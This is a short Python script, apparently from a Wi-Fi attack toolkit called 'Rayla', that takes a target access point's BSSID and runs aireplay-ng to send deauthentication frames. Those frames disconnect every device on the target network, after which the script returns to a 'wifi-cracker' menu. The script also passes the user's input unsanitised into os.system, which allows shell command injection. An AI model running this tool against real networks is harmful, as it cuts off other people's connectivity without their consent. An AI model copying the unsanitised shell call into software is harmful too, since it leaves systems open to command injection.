import os

os.system("clear")

print()

print("Welcome to the Rayla device deauthentator")

print()

bssid = input("Enter BSSID of target Access Point: ")

print()

print("Rayla will attempt to deauthenticate " + bssid + ". This will temporarily disconnect all devices currently connected to the target network.")
print()
input("Press any button to continue the deauthentication process.")

#os.system("airmon-ng start wlan0")

os.system("aireplay-ng --deauth 40 -a " + bssid + " wlan0")

print()

input("Press any button to go back to menu")
os.system("python3 /rayla/python/wifi-cracker.py")

#os.system("python3 /rayla/python/wifi-cracker.py")
